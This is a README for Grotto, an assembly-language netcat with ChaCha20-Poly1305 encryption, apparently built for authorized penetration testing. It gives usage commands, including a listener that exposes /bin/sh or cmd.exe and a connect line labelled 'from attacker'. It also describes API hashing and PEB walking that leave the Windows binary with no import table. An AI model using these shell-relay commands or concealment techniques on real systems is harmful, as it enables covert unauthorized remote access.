<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-light.svg">
  <img alt="Grotto" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Grotto/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Assembly](https://img.shields.io/badge/language-Assembly-blueviolet.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**ChaCha20-Poly1305 encrypted netcat in pure x86_64 NASM assembly.**

Bidirectional authenticated encryption over TCP with full RFC 8439 AEAD. Cross-platform — Linux ELF (~13 KB) and Windows PE (~8 KB). Zero imports, zero dependencies. PEB walking on Windows, raw syscalls on Linux.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

**Prerequisites:** NASM, `ld` (Linux), `x86_64-w64-mingw32-ld` (Windows)

```bash
git clone https://github.com/Real-Fruit-Snacks/Grotto.git
cd Grotto
make all
```

**Verify:**

```bash
ls -la build/grotto build/grotto.exe
file build/grotto        # ELF 64-bit, statically linked, ~13 KB
file build/grotto.exe    # PE32+ executable, ~8 KB
```

---

## Features

### ChaCha20-Poly1305 AEAD

Full RFC 8439 in pure assembly. 256-bit PSK, random nonce per message, tampered payloads silently rejected.

```bash
KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
./grotto -l -p 4444 -k $KEY          # listener
./grotto -c 10.10.14.1 -p 4444 -k $KEY   # connect
```

### Cross-Platform

Dual-target build from shared crypto core. Same wire protocol, full interoperability.

```bash
make linux    # build/grotto     (~13 KB static ELF)
make windows  # build/grotto.exe (~8 KB minimal PE)
```

### Encrypted Shell Relay

The `-e` flag spawns an interactive shell with stdin/stdout piped through the encrypted channel.

```bash
./grotto -l -p 4444 -k $KEY -e /bin/sh     # Linux
./grotto -l -p 4444 -k $KEY -e cmd.exe     # Windows
./grotto -c 10.10.14.1 -p 4444 -k $KEY     # connect from attacker
```

### PEB Walk + Hash Lookup

Windows APIs resolved at runtime via PEB walking and ror13 hash matching. No import table, no strings.

```nasm
; All 25 APIs resolved dynamically from kernel32, ws2_32, advapi32
; Zero DLL imports — nothing in the PE import directory
```

### Connect / Listen Modes

Standard netcat-style bidirectional relay with authenticated encryption on every byte.

```bash
./grotto -l -p 4444 -k $KEY                # listen mode
./grotto -c 10.10.14.1 -p 4444 -k $KEY     # connect mode
echo "secret" | ./grotto -c host -p 4444 -k $KEY  # pipe data
```

---

## Architecture

```
grotto/
├── linux/
│   ├── main.asm       # Entry point, CLI parsing
│   ├── net.asm        # Raw syscall networking
│   ├── io.asm         # poll(2) bidirectional relay
│   ├── crypto.asm     # Nonce generation, encrypt/decrypt
│   └── shell.asm      # fork/execve/dup2
├── windows/
│   ├── main.asm       # Entry point, CLI parsing
│   ├── peb.asm        # PEB walking, ror13 resolution
│   ├── net.asm        # Winsock2 networking
│   ├── io.asm         # Threaded relay (CreateThread)
│   ├── crypto.asm     # SystemFunction036 nonce
│   └── shell.asm      # CreateProcessA with pipes
├── shared/
│   ├── chacha20.inc   # ChaCha20 stream cipher
│   ├── poly1305.inc   # Poly1305 MAC
│   └── aead.inc       # AEAD encrypt/decrypt
├── build.sh           # Build script with PSK generation
└── Makefile           # NASM + ld build targets
```

---

## Platform Support

| | Linux | Windows |
|---|---|---|
| Binary Size | ~13 KB (static ELF) | ~8 KB (minimal PE) |
| API Resolution | Raw syscalls | PEB walk + ror13 hash |
| I/O Relay | `poll(2)` multiplexed | `CreateThread` + `WaitForMultipleObjects` |
| Shell Execution | `fork`/`execve`/`dup2` | `CreateProcessA` with pipes |
| CSPRNG | `getrandom` | `SystemFunction036` |
| Dependencies | None (no libc) | None (no DLL imports) |

---

## Security

Report vulnerabilities via [GitHub Security Advisories](https://github.com/Real-Fruit-Snacks/Grotto/security/advisories). 90-day responsible disclosure.

**Grotto does not:**
- Manage implants, tasking, or beaconing (not a C2)
- Generate payloads or exploit modules (not a framework)
- Destroy evidence or tamper with logs (not anti-forensics)
- Evade EDR/XDR behavioral analysis (not evasion tooling)

---

## License

[MIT](LICENSE) — Copyright 2026 Real-Fruit-Snacks
